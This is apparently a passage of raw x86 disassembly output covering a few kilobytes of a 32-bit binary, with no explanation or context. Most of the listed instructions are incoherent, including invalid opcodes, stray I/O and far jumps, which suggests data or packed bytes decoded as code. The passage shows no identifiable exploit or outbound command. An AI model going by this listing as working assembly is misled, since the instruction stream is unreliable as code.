  4040de:	mov    bh,0x69
  4040e0:	test   BYTE PTR [edi-0x7d],ch
  4040e3:	mov    ds:0xa0283011,al
  4040e8:	mov    ah,0x29
  4040ea:	(bad)  
  4040eb:	cmc    
  4040ec:	out    0xbd,eax
  4040ee:	arpl   WORD PTR [esi-0x1c154890],ax
  4040f4:	push   ebp
  4040f5:	jne    0x404116
  4040f7:	aad    0x94
  4040f9:	scas   al,BYTE PTR es:[edi]
  4040fa:	mov    edx,0x814f2354
  4040ff:	mov    esi,0x5902dd81
  404104:	mov    bh,0x18
  404106:	add    al,0x56
  404108:	hlt    
  404109:	push   ecx
  40410a:	xor    DWORD PTR [esi+ebx*2+0x6ef25d5d],0xfffffffc
  404112:	jg     0x40411e
  404114:	inc    ebp
  404115:	push   ss
  404116:	xchg   esp,eax
  404117:	js     0x4040e3
  404119:	and    ebp,esp
  40411b:	pop    esi
  40411c:	xchg   ebx,eax
  40411d:	jp     0x404143
  40411f:	call   0xee9c:0x1bb3f0a6
  404126:	fdivr  QWORD PTR [edi-0x14]
  404129:	ins    DWORD PTR es:[edi],dx
  40412a:	leave  
  40412b:	ins    BYTE PTR es:[edi],dx
  40412c:	jg     0x4041a1
  40412e:	stos   BYTE PTR es:[edi],al
  40412f:	mov    BYTE PTR [eax],bh
  404131:	mov    WORD PTR [eax-0x53],?
  404134:	in     al,0xc8
  404136:	jne    0x40410b
  404138:	sub    BYTE PTR [esi+0x4ce4a796],bl
  40413e:	inc    esp
  40413f:	cmp    cl,BYTE PTR [eax+ebx*2+0x75db65b8]
  404146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404147:	sub    dl,BYTE PTR [ebx+0x180cd6b6]
  40414d:	push   ds
  40414e:	mov    DWORD PTR [ebx],esp
  404150:	pusha  
  404151:	add    al,0x36
  404153:	test   ecx,eax
  404155:	js     0x4040e9
  404157:	cmp    ah,BYTE PTR [edi-0x2ab1ea3]
  40415d:	mov    WORD PTR [eax+0x4697d9da],gs
  404163:	mov    esi,0x6f72d9df
  404168:	cmp    eax,0xfd245bda
  40416d:	mov    eax,0xf01854c5
  404172:	add    al,0xb
  404174:	(bad)  
  404175:	dec    esi
  404176:	repz inc eax
  404178:	popa   
  404179:	lahf   
  40417a:	into   
  40417b:	cmp    ebx,ebx
  40417d:	pop    edx
  40417e:	push   esp
  40417f:	in     al,0x9f
  404181:	xchg   BYTE PTR [edx-0x21],al
  404184:	dec    edi
  404185:	push   eax
  404186:	shl    DWORD PTR [eax-0x71],1
  404189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40418a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40418b:	pop    ds
  40418c:	push   ebx
  40418d:	mov    cs,WORD PTR [ebx+0x37b30a5e]
  404193:	das    
  404194:	xor    edx,DWORD PTR [esi+0x24]
  404197:	adc    ah,dh
  404199:	adc    eax,0x9842ba47
  40419e:	es mov esp,0xef09bbff
  4041a4:	loope  0x4041aa
  4041a6:	int3   
  4041a7:	lds    ebp,FWORD PTR [edx+0x7309d1cb]
  4041ad:	shl    DWORD PTR [edx+0x29ca37b4],0xab
  4041b4:	mov    cl,0xea
  4041b6:	inc    esi
  4041b7:	jnp    0x40421d
  4041b9:	mov    BYTE PTR [ecx+0x29],cl
  4041bc:	push   eax
  4041bd:	mov    ebp,0xc112c2f0
  4041c2:	mov    ecx,0xaef75f10
  4041c7:	pop    eax
  4041c8:	xchg   BYTE PTR [esi+0x6b970fc9],bh
  4041ce:	cmc    
  4041cf:	lock mov al,0x55
  4041d2:	dec    esp
  4041d3:	jp     0x404200
  4041d5:	jecxz  0x4041de
  4041d7:	nop
  4041d8:	je     0x4041c1
  4041da:	adc    edi,DWORD PTR [esi-0x626d4f71]
  4041e0:	data16 mov BYTE PTR [edx],cl
  4041e3:	dec    edi
  4041e4:	mov    eax,DWORD PTR [eax+0x3]
  4041e7:	pop    ecx
  4041e8:	jmp    0xa5610960
  4041ed:	stos   BYTE PTR es:[edi],al
  4041ee:	and    edx,0x48ff2de0
  4041f4:	repnz in al,0xf4
  4041f7:	lock cwde 
  4041f9:	dec    ebx
  4041fa:	push   esp
  4041fb:	imul   esi,DWORD PTR [ebx],0xf2a7c23e
  404201:	(bad)  
  404202:	fs fisub DWORD PTR gs:[ebx]
  404206:	and    DWORD PTR [esi-0x6cf06733],eax
  40420c:	sub    BYTE PTR [eax+eiz*4+0xafed187],ah
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si+0x15],0xffffffda
  404248:	push   0x7e25d505
  40424d:	jle    0x4042be
  40424f:	jge    0x4042cf
  404251:	jle    0x404235
  404253:	shr    DWORD PTR [edx],cl
  404255:	cmp    ebp,esp
  404257:	rcl    DWORD PTR [ebx+ecx*4],cl
  40425a:	scas   al,BYTE PTR es:[edi]
  40425b:	push   es
  40425c:	int    0x52
  40425e:	sub    ecx,DWORD PTR es:[ecx]
  404261:	xlat   BYTE PTR ds:[ebx]
  404262:	nop
  404263:	jnp    0x4041ec
  404265:	push   esi
  404266:	mov    ebx,0x55873653
  40426b:	adc    BYTE PTR [esi+0x41d329bf],bl
  404271:	mov    esp,0x40d8de04
  404276:	mov    esi,0x77dfa6bb
  40427b:	xor    al,0xc2
  40427d:	push   ecx
  40427e:	mov    ebp,0x7e0f549c
  404283:	sbb    eax,0x288487fa
  404288:	or     ah,ch
  40428a:	push   ebp
  40428b:	pop    ecx
  40428c:	jg     0x4042fa
  40428e:	mov    ebp,0x58dbad64
  404293:	ret    0xba75
  404296:	sub    BYTE PTR [edx-0x43],0x57
  40429a:	call   0xfedbf9a7
  40429f:	aad    0xa3
  4042a1:	adc    esi,DWORD PTR [eax+0x4eebb8ae]
  4042a7:	pop    es
  4042a8:	xor    eax,0xec1a758f
  4042ad:	pop    es
  4042ae:	inc    ebx
  4042af:	dec    ebx
  4042b0:	push   esi
  4042b1:	(bad)  
  4042b2:	femms  
  4042b4:	out    0xf,eax
  4042b6:	pop    ebx
  4042b7:	mov    dl,0xc3
  4042b9:	sbb    al,0xbd
  4042bb:	lock rcr bl,0x73
  4042bf:	imul   ebp,esp,0xe362be7c
  4042c5:	mov    ds:0xba499be3,al
  4042ca:	sbb    DWORD PTR [ebp-0x1f],edi
  4042cd:	lods   eax,DWORD PTR ds:[esi]
  4042ce:	pop    esi
  4042cf:	cld    
  4042d0:	push   ss
  4042d1:	test   DWORD PTR [esi-0x4f],edi
  4042d4:	sub    dl,BYTE PTR [edx+0x6c]
  4042d7:	pop    edx
  4042d8:	(bad)  
  4042d9:	adc    eax,0x2f544e5f
  4042de:	mov    ds:0xe07e6379,eax
  4042e3:	dec    edi
  4042e4:	jge    0x404302
  4042e6:	xchg   ebx,eax
  4042e7:	nop
  4042e8:	cld    
  4042e9:	retf   0x7085
  4042ec:	repz js 0x4042cf
  4042ef:	fcmovnbe st,st(3)
  4042f1:	cmp    DWORD PTR [edx],edx
  4042f3:	inc    esi
  4042f4:	ret    
  4042f5:	mov    ds:0x10966992,al
  4042fa:	inc    ebp
  4042fb:	and    bh,bl
  4042fd:	cmovp  ecx,DWORD PTR [eax+0x1c3d23fd]
  404304:	xchg   ebp,eax
  404305:	daa    
  404306:	add    ch,BYTE PTR [ebp+ebp*2-0x7a8e8a85]
  40430d:	imul   ecx,DWORD PTR [edi-0x76],0xffffff8a
  404311:	mov    DWORD PTR ds:0x8f8672fd,edi
  404317:	mov    ds:0x738d5b0,eax
  40431c:	inc    edi
  40431d:	adc    bh,BYTE PTR [ebp+0x34]
  404320:	xchg   esi,eax
  404321:	add    eax,0xf512b52f
  404326:	pusha  
  404327:	jmp    0xc4f:0x86671dd9
  40432e:	push   ebx
  40432f:	daa    
  404330:	pop    edx
  404331:	or     DWORD PTR [eax+0x56],esp
  404334:	pop    es
  404335:	ret    
  404336:	ins    DWORD PTR es:[edi],dx
  404337:	repz push edx
  404339:	jmp    0x40436e
  40433b:	cwde   
  40433c:	push   cs
  40433d:	and    al,0xb6
  40433f:	xor    bh,BYTE PTR [ebx+0x7d968265]
  404345:	ss in  eax,dx
  404347:	hlt    
  404348:	adc    al,0x4f
  40434a:	mov    eax,ds:0xe67dd2cd
  40434f:	jmp    0x4043c8
  404351:	or     DWORD PTR [ebx-0x515a5c4f],edx
  404357:	mov    edi,0x3bf76d21
  40435c:	mov    eax,0xbed78ac6
  404361:	and    al,0x1f
  404363:	pop    ebx
  404364:	stos   BYTE PTR es:[edi],al
  404365:	push   edx
  404366:	jbe    0x404385
  404368:	scas   eax,DWORD PTR es:[edi]
  404369:	mov    eax,ds:0x27e95250
  40436e:	dec    esp
  40436f:	cmp    al,0x4a
  404371:	aas    
  404372:	add    al,0x7a
  404374:	fsubr  DWORD PTR [edx]
  404376:	ror    DWORD PTR [edx-0x69],cl
  404379:	pop    edi
  40437a:	lock mov ah,0x33
  40437d:	(bad)  
  40437e:	in     eax,dx
  40437f:	jb     0x404370
  404381:	cld    
  404382:	test   eax,0x5eca7be7
  404387:	addr16 sbb al,0x6c
  40438a:	mov    edi,0x190e75b9
  40438f:	lea    esp,[edi-0x3148e782]
  404395:	cmp    DWORD PTR [esi+0x5e],ecx
  404398:	aad    0x41
  40439a:	sahf   
  40439b:	push   ebx
  40439c:	je     0x40439d
  40439e:	rcr    cl,0xa6
  4043a1:	in     eax,dx
  4043a2:	rcr    BYTE PTR [bp+0x38],0x9e
  4043a7:	dec    ebx
  4043a8:	imul   ebp,DWORD PTR [eax+0x6b],0xffffffdc
  4043ac:	lahf   
  4043ad:	imul   eax,DWORD PTR [edi-0x53],0xffffffe1
  4043b1:	xlat   BYTE PTR ds:[ebx]
  4043b2:	hlt    
  4043b3:	in     eax,0x92
  4043b5:	cmp    eax,0x967be5cc
  4043ba:	cmp    al,0xa
  4043bc:	xchg   esi,eax
  4043bd:	fwait
  4043be:	xchg   ecx,eax
  4043bf:	ret    
  4043c0:	xchg   edx,eax
  4043c1:	std    
  4043c2:	das    
  4043c3:	pop    edi
  4043c4:	imul   esi,DWORD PTR [eax+0x1582d7fa],0x3ec5a638
  4043ce:	dec    ebx
  4043cf:	inc    edi
  4043d0:	sub    al,0xc0
  4043d2:	fidiv  WORD PTR [ebx+edx*2-0x45]
  4043d6:	push   esp
  4043d7:	les    edx,FWORD PTR [ecx]
  4043d9:	pop    esp
  4043da:	rcr    BYTE PTR [ebx],0x5d
  4043dd:	sbb    al,BYTE PTR [eax-0x25c9a891]
  4043e3:	loop   0x4043fd
  4043e5:	mov    edx,0x17307416
  4043ea:	jp     0x4043a3
  4043ec:	xchg   esi,eax
  4043ed:	or     eax,0x5f3d6779
  4043f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043f4:	xchg   ebp,eax
  4043f5:	add    cl,BYTE PTR [ebp-0x32]
  4043f8:	jb     0x4043cc
  4043fa:	push   ss
  4043fb:	popf   
  4043fc:	jecxz  0x4043ca
  4043fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043ff:	mov    esp,gs
  404401:	and    BYTE PTR [ebp+ebp*4+0x7e],cl
  404405:	mov    esi,0xa1a34659
  40440a:	or     esi,DWORD PTR [ecx]
  40440c:	mov    cl,0xc1
  40440e:	ins    DWORD PTR es:[edi],dx
  40440f:	out    dx,al
  404410:	inc    ecx
  404411:	mov    ds:0xb74e7de,al
  404416:	cmp    al,0xfd
  404418:	mov    DWORD PTR [ecx-0x78],eax
  40441b:	out    dx,eax
  40441c:	adc    cl,BYTE PTR [eax]
  40441e:	xlat   BYTE PTR ds:[ebx]
  40441f:	out    dx,al
  404420:	sahf   
  404421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404422:	inc    esp
  404423:	xchg   edi,eax
  404424:	jp     0x4043e1
  404426:	mov    al,ds:0x94d0c40
  40442b:	je     0x4044a8
  40442d:	icebp  
  40442e:	xchg   ebx,eax
  40442f:	cmc    
  404430:	add    cl,BYTE PTR [ebx-0x6e]
  404433:	adc    dh,BYTE PTR [ebx-0x257e87dc]
  404439:	xchg   ebx,eax
  40443a:	adc    eax,DWORD PTR [edx+0x50]
  40443d:	out    0x6a,eax
  40443f:	mov    ecx,0x34deedd
  404444:	icebp  
  404445:	fnstenv [ecx+0x311a72af]
  40444b:	sbb    al,0x89
  40444d:	fidivr DWORD PTR [ecx+0x229a6e72]
  404453:	push   ss
  404454:	les    ebx,FWORD PTR [edx-0x61610197]
  40445a:	xchg   edi,eax
  40445b:	lahf   
  40445c:	mov    edi,0x65c5ac22
  404461:	in     al,dx
  404462:	(bad)  
  404463:	cmp    DWORD PTR [edx+0x175080c4],esi
  404469:	in     eax,0x8f
  40446b:	test   eax,0x462adbf1
  404470:	out    dx,eax
  404471:	scas   eax,DWORD PTR es:[edi]
  404472:	or     dl,BYTE PTR [esi]
  404474:	int    0x8b
  404476:	shl    DWORD PTR [esi],1
  404478:	adc    DWORD PTR [esi-0x6c7f1b62],esi
  40447e:	jge    0x4044e1
  404480:	mov    ds:0xa1f2cd56,al
  404485:	mov    esi,0x2b7de802
  40448a:	add    bh,dl
  40448c:	push   0xdb4c91d3
  404491:	mov    BYTE PTR [ebp-0x7d],dl
  404494:	jb     0x4044e3
  404496:	lahf   
  404497:	add    BYTE PTR [ecx-0x2b],al
  40449a:	into   
  40449b:	imul   edi,DWORD PTR [eax+0x9],0xced21302
  4044a2:	sbb    DWORD PTR [ebx-0x69],ebx
  4044a5:	(bad)  
  4044a6:	test   DWORD PTR [ebx],0xee553da
  4044ac:	push   ebx
  4044ad:	push   0xffffffb8
  4044af:	imul   eax,DWORD PTR ds:0x52a3c3e4,0x62
  4044b6:	inc    esi
  4044b7:	test   al,0x95
  4044b9:	dec    esp
  4044ba:	push   ebx
  4044bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044bc:	in     eax,0xbe
  4044be:	sbb    dh,BYTE PTR [edi]
  4044c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044c1:	and    BYTE PTR [edi+ecx*8],dh
  4044c4:	cwde   
  4044c5:	mov    al,ds:0xa926005e
  4044ca:	mov    dl,0x5f
  4044cc:	pop    ss
  4044cd:	lods   al,BYTE PTR ds:[esi]
  4044ce:	mov    ah,0x89
  4044d0:	xor    eax,edx
  4044d2:	and    esi,DWORD PTR [edx+esi*4+0x21]
  4044d6:	ds jmp 0x8b1201d8
  4044dc:	in     eax,0x6b
  4044de:	inc    ebp
  4044df:	fidiv  DWORD PTR [edx+esi*1-0x43]
  4044e3:	add    eax,0x2f4da132
  4044e8:	sub    al,0x3e
  4044ea:	outs   dx,BYTE PTR ds:[esi]
  4044eb:	jo     0x4044b4
  4044ed:	xlat   BYTE PTR ds:[ebx]
  4044ee:	push   0x3bd30af
  4044f3:	mov    bl,0xd3
  4044f5:	sbb    al,0x3b
  4044f7:	jle    0x40451a
  4044f9:	pop    ebp
  4044fa:	and    al,0xf0
  4044fc:	jp     0x4044c4
  4044fe:	stos   BYTE PTR es:[edi],al
  4044ff:	test   eax,0xfebc0d8a
  404504:	dec    esp
  404505:	push   edx
  404506:	stos   DWORD PTR es:[edi],eax
  404507:	sub    al,0xb7
  404509:	ss iret 
  40450b:	les    edx,FWORD PTR [ecx]
  40450d:	ret    
  40450e:	shl    DWORD PTR [eax],1
  404510:	fwait
  404511:	(bad)  
  404512:	in     al,dx
  404513:	rcl    DWORD PTR [ebx],1
  404515:	mov    ebp,0xed590b73
  40451a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40451b:	(bad)  
  40451c:	jge    0x404518
  40451e:	in     al,0xa9
  404520:	aam    0x50
  404522:	in     eax,dx
  404523:	pop    ebp
  404524:	jg     0x4044fa
  404526:	in     al,0xed
  404528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404529:	pop    edx
  40452a:	cmp    esp,DWORD PTR [ecx+ebx*4]
  40452d:	inc    ebx
  40452e:	jb     0x4044e2
  404530:	gs je  0x40457a
  404533:	in     al,0x4d
  404535:	sbb    DWORD PTR [edi],esi
  404537:	sbb    DWORD PTR [ebx],ebp
  404539:	and    esi,DWORD PTR [edx-0x7c]
  40453c:	scas   al,BYTE PTR es:[edi]
  40453d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40453e:	adc    edx,edx
  404540:	fwait
  404541:	sub    al,0xc8
  404543:	add    eax,0xcd740377
  404548:	mov    cl,0x46
  40454a:	test   al,0xfe
  40454c:	repz cmp DWORD PTR [ebp+esi*1+0x518ce7c7],ebx
  404554:	imul   edx,ebp,0xffffff88
  404557:	mov    DWORD PTR [edi+0xaa9ad22],ecx
  40455d:	inc    eax
  40455e:	loop   0x4045a2
  404560:	xchg   ebx,eax
  404561:	in     eax,dx
  404562:	cli    
  404563:	in     eax,dx
  404564:	aad    0x6a
  404566:	adc    al,0xa6
  404568:	sahf   
  404569:	inc    esi
  40456a:	jbe    0x4045d7
  40456c:	mov    ch,0x9
  40456e:	in     al,0x46
  404570:	cmc    
  404571:	stc    
  404572:	daa    
  404573:	push   eax
  404574:	and    cl,BYTE PTR [ecx]
  404576:	cmp    ebx,edx
  404578:	cmc    
  404579:	int3   
  40457a:	stos   DWORD PTR es:[edi],eax
  40457b:	adc    al,0xa7
  40457d:	daa    
  40457e:	xor    edx,DWORD PTR [esi+0x46]
  404581:	inc    ebp
  404582:	out    dx,al
  404583:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  404585:	popf   
  404586:	inc    ecx
  404587:	jo     0x404564
  404589:	push   ecx
  40458a:	sbb    BYTE PTR [edx],ch
  40458c:	pop    edi
  40458d:	pop    eax
  40458e:	mov    ebx,ebp
  404590:	dec    ecx
  404591:	retf   0xf140
  404594:	mov    DWORD PTR [esi],ecx
  404596:	test   BYTE PTR [ecx-0x766fc2ce],0x34
  40459d:	data16 mov es,WORD PTR [eax+ebp*1-0x302f53de]
  4045a5:	or     BYTE PTR [edi-0x79386101],dl
  4045ab:	mov    ch,BYTE PTR [ecx-0xd0de869]
  4045b1:	call   0x413840c1
  4045b6:	out    0xb2,al
  4045b8:	cmp    eax,0xef5b20e7
  4045bd:	inc    ebp
  4045be:	xchg   esi,eax
  4045bf:	sub    al,BYTE PTR [esi]
  4045c1:	pop    esi
  4045c2:	das    
  4045c3:	jb     0x40459d
  4045c5:	sub    eax,0xe8e15a2f
  4045ca:	jg     0x404630
  4045cc:	imul   ebx,DWORD PTR [edx-0x78],0xc72262f2
  4045d3:	fld    DWORD PTR [ebx]
  4045d5:	repnz push cs
  4045d7:	jle    0x4045cc
  4045d9:	(bad)  
  4045da:	mov    cl,0x14
  4045dc:	push   edx
  4045dd:	call   eax
  4045df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045e0:	neg    ch
  4045e2:	adc    al,0xb2
  4045e4:	cld    
  4045e5:	cli    
  4045e6:	mov    ebx,0x6c81e455
  4045eb:	(bad)  
  4045ec:	arpl   WORD PTR [ecx+0x44],ax
  4045ef:	out    dx,al
  4045f0:	cmp    ch,BYTE PTR [eax]
  4045f2:	fs jb  0x4045d2
  4045f5:	push   esi
  4045f6:	aad    0x47
  4045f8:	add    DWORD PTR [edi-0x4f],ebx
  4045fb:	jnp    0x404654
  4045fd:	xchg   DWORD PTR [edx+0x9],ebp
  404600:	adc    cl,BYTE PTR [ebx+0x223ec25b]
  404606:	mov    ds:0xf2fd2a69,al
  40460b:	or     al,0xe2
  40460d:	pop    esp
  40460e:	add    DWORD PTR [ebx-0xf],edi
  404611:	ret    0x7c61
  404614:	inc    eax
  404615:	push   es
  404616:	pop    es
  404617:	cs mov dl,0x4a
  40461a:	int3   
  40461b:	dec    ecx
  40461c:	lock cs aam 0x3b
  404620:	jmp    0x4045c4
  404622:	loopne 0x4045ce
  404624:	and    BYTE PTR [ebx],bl
  404626:	add    bl,BYTE PTR [ebx-0x7a65c090]
  40462c:	fstp   QWORD PTR [ecx]
  40462e:	pop    esp
  40462f:	outs   dx,DWORD PTR ds:[esi]
  404630:	and    ecx,ecx
  404632:	inc    ebp
  404633:	ret    0xa8f4
  404636:	mov    eax,ds:0x4b076c24
  40463b:	inc    esi
  40463c:	cwde   
  40463d:	sub    ebx,ebp
  40463f:	mov    al,ds:0xffe9012b
  404644:	xor    BYTE PTR [ebp+0x413dc205],cl
  40464a:	add    bh,bh
  40464c:	xor    BYTE PTR [edi+0x534343d3],al
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0x1e5d4de3
  404675:	dec    edx
  404676:	ret    0x7e21
  404679:	jle    0x4046ea
  40467b:	jge    0x4046fb
  40467d:	jle    0x40462d
  40467f:	dec    ebx
  404680:	jne    0x4046a7
  404682:	push   ecx
  404683:	(bad)  
  404685:	pop    esp
  404686:	(bad)  
  404688:	ds sbb al,0x58
  40468b:	pop    ebx
  40468c:	sbb    ebp,eax
  40468e:	push   ebp
  40468f:	ja     0x40470b
  404691:	popf   
  404692:	(bad)  
  404693:	xchg   edx,eax
  404694:	fwait
  404695:	mov    ah,0x99
  404697:	fdiv   DWORD PTR [eax+0x72]
  40469a:	cli    
  40469b:	fimul  DWORD PTR [eax]
  40469d:	lahf   
  40469e:	add    DWORD PTR [esi+0x3fef067f],ebx
  4046a4:	sub    DWORD PTR [edx-0x4f7af960],0xffffffe6
  4046ab:	out    dx,al
  4046ac:	lock jl 0x4046fe
  4046af:	or     al,0xac
  4046b1:	cli    
  4046b2:	xor    ah,BYTE PTR [eax]
  4046b4:	mov    ebp,DWORD PTR [ebx+eax*1]
  4046b7:	pop    edi
  4046b8:	cwde   
  4046b9:	jo     0x4046ed
  4046bb:	sbb    BYTE PTR [edx],dh
  4046bd:	mov    bh,0x67
  4046bf:	ins    BYTE PTR es:[edi],dx
  4046c0:	fld1   
  4046c2:	ins    BYTE PTR es:[edi],dx
  4046c3:	stc    
  4046c4:	mul    cl
  4046c6:	sti    
  4046c7:	pop    ds
  4046c8:	fwait
  4046c9:	sbb    BYTE PTR [edx],bl
  4046cb:	outs   dx,DWORD PTR ds:[esi]
  4046cc:	loope  0x404719
  4046ce:	mov    esp,0xb001a28d
  4046d3:	sbb    BYTE PTR [esi],ah
  4046d5:	adc    DWORD PTR [ebp+0x7b],esi
  4046d8:	shr    DWORD PTR [eax+ebp*2],cl
  4046db:	add    eax,0xe73c5e26
  4046e0:	cmc    
  4046e1:	stos   BYTE PTR es:[edi],al
  4046e2:	mov    DWORD PTR [ecx-0x5e],eax
  4046e5:	popa   
  4046e6:	mov    bl,0x87
  4046e8:	pop    esp
  4046e9:	scas   eax,DWORD PTR es:[edi]
  4046ea:	fmul   DWORD PTR [ebx+ebx*4]
  4046ed:	jb     0x404769
  4046ef:	dec    eax
  4046f0:	repnz int 0x84
  4046f3:	mov    WORD PTR ds:0x7d0c7adb,es
  4046f9:	or     esi,DWORD PTR [eax-0x3c]
  4046fc:	gs sti 
  4046fe:	cmp    edi,DWORD PTR [ebx+esi*1-0x650b4f60]
  404705:	imul   ebp,DWORD PTR [ebx],0x78
  404708:	jp     0x404737
  40470a:	in     al,0xb4
  40470c:	in     eax,0xd9
  40470e:	icebp  
  40470f:	sbb    DWORD PTR [edi],ebp
  404711:	in     al,dx
  404712:	ror    bh,1
  404714:	(bad)  
  404715:	adc    DWORD PTR [edi-0x610c395e],ecx
  40471b:	mov    ds:0xe806525e,al
  404720:	in     al,0xdb
  404722:	call   0xd914:0xb85e649
  404729:	call   0x344dca57
  40472e:	arpl   WORD PTR [ecx+ecx*1+0x39f8e66a],bp
  404735:	outs   dx,DWORD PTR ds:[esi]
  404736:	not    DWORD PTR [edi]
  404738:	inc    ecx
  404739:	ss pop eax
  40473b:	or     BYTE PTR [esi+ebx*8+0x4043b6ea],0x6e
  404743:	push   ebp
  404744:	rcr    BYTE PTR [ecx+0x213ef3a3],cl
  40474a:	jl     0x404783
  40474c:	inc    ebp
  40474d:	sar    DWORD PTR [edi-0x2d11eb03],cl
  404753:	cdq    
  404754:	sbb    al,0xe8
  404756:	cmp    eax,0xb8df5bfd
  40475b:	jl     0x40477e
  40475d:	test   edi,ebx
  40475f:	xchg   ebp,eax
  404760:	mov    eax,ds:0x64fc5c63
  404765:	(bad)  
  404766:	jg     0x404782
  404768:	test   eax,0x2de9d2
  40476d:	sub    esi,ebx
  40476f:	jne    0x4047b3
  404771:	mov    bh,0x5
  404773:	retf   
  404774:	fnstenv [eax]
  404776:	cmp    al,0x40
  404778:	pop    ebp
  404779:	mov    edx,0xac285305
  40477e:	bound  ecx,QWORD PTR [ebx-0x310d25ee]
  404784:	pop    ebp
  404785:	and    al,0x86
  404787:	shl    BYTE PTR [edi-0x7eff240],1
  40478d:	sub    edx,DWORD PTR [esi]
  40478f:	add    esp,DWORD PTR [edi-0x3249cbe9]
  404795:	hlt    
  404796:	rol    DWORD PTR [eax+0x9],1
  404799:	(bad)  
  40479a:	dec    esi
  40479b:	mov    ds:0x92395e07,eax
  4047a0:	jmp    0x40476f
  4047a2:	repz jmp 0xcc53:0xb940ed7c
  4047aa:	cwde   
  4047ab:	xchg   esi,eax
  4047ac:	pop    eax
  4047ad:	push   ebp
  4047ae:	or     al,0x71
  4047b0:	xchg   ebx,eax
  4047b1:	adc    esp,DWORD PTR [ecx]
  4047b3:	int3   
  4047b4:	inc    edi
  4047b5:	jns    0x40480b
  4047b7:	xor    eax,0xe686770e
  4047bc:	pushf  
  4047bd:	arpl   WORD PTR ds:0xb13ec404,sp
  4047c3:	in     eax,0x12
  4047c5:	add    al,BYTE PTR [esi+eax*2+0x267c4860]
  4047cc:	sbb    esi,ebx
  4047ce:	ja     0x4047ed
  4047d0:	cmp    DWORD PTR [edx+0x79af5e47],esi
  4047d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047d7:	pop    esi
  4047d8:	fistp  QWORD PTR [edx+edx*2+0x2933c71f]
  4047df:	retf   0x8949
  4047e2:	mov    edx,0x658fc7ac
  4047e7:	test   BYTE PTR [edx+eax*4-0x8],0xa5
  4047ec:	lods   eax,DWORD PTR ds:[esi]
  4047ed:	add    BYTE PTR [edi-0x55f42726],0x13
  4047f4:	test   edi,esi
  4047f6:	pop    esp
  4047f7:	frstor ds:0x947013a2
  4047fd:	sbb    BYTE PTR [ecx-0x76898a91],dh
  404803:	rcl    DWORD PTR ds:0x9e46c329,cl
  404809:	mov    dh,0x27
  40480b:	test   al,al
  40480d:	out    0x8b,eax
  40480f:	ja     0x404880
  404811:	cmp    BYTE PTR [esi+esi*2-0x77853407],ah
  404818:	push   ebx
  404819:	mov    ch,BYTE PTR [eax-0x145e7a8d]
  40481f:	mov    bh,0x79
  404821:	cwde   
  404822:	ins    BYTE PTR es:[edi],dx
  404823:	cwde   
  404824:	xor    DWORD PTR [ebx+0x2],ebx
  404827:	inc    eax
  404828:	data16 je 0x4047b4
  40482b:	add    esi,ebx
  40482d:	jno    0x4047f6
  40482f:	stos   BYTE PTR es:[edi],al
  404830:	mov    dl,0x7b
  404832:	jecxz  0x40487a
  404834:	pop    esi
  404835:	test   eax,0x70ba97e9
  40483a:	aaa    
  40483b:	jp     0x4047ca
  40483d:	pop    ebp
  40483e:	es pop ds
  404840:	scas   eax,DWORD PTR es:[edi]
  404841:	ins    DWORD PTR es:[edi],dx
  404842:	mov    esp,0xcd6a7686
  404847:	inc    ebp
  404848:	outs   dx,DWORD PTR ds:[esi]
  404849:	ja     0x4048c4
  40484b:	push   edi
  40484c:	or     DWORD PTR [esi+esi*8],ebx
  40484f:	icebp  
  404850:	cdq    
  404851:	adc    eax,esp
  404853:	lock cmp al,0x28
  404856:	mov    dh,0x66
  404858:	jmp    0x24aeed9e
  40485d:	xchg   DWORD PTR [ebx],ebx
  40485f:	xor    esp,DWORD PTR [ecx]
  404861:	les    ecx,FWORD PTR [esi]
  404863:	cld    
  404864:	sub    eax,0xf2e6b1a9
  404869:	iret   
  40486a:	mov    al,0xdc
  40486c:	xor    BYTE PTR [edx-0x4a],al
  40486f:	jns    0x40488e
  404871:	outs   dx,DWORD PTR ds:[esi]
  404872:	rol    DWORD PTR [edx-0x1a],1
  404875:	pop    ds
  404876:	push   edi
  404877:	int3   
  404878:	add    al,dh
  40487a:	jae    0x4048d5
  40487c:	rcr    DWORD PTR [ebx-0x28],cl
  40487f:	add    esi,DWORD PTR [ecx-0x3fc24ad3]
  404885:	jl     0x404842
  404887:	sub    esi,DWORD PTR [esi+0x77]
  40488a:	les    eax,FWORD PTR [edi-0x100c572f]
  404890:	push   0x75
  404892:	push   ebx
  404893:	xor    DWORD PTR [eax-0xb],ebx
  404896:	cmp    BYTE PTR [ebp-0x39],0xdd
  40489a:	jmp    0x4048f9
  40489c:	pop    ecx
  40489d:	push   esp
  40489e:	or     DWORD PTR [edi],ecx
  4048a0:	push   es
  4048a1:	sbb    DWORD PTR [ecx+0x37],edi
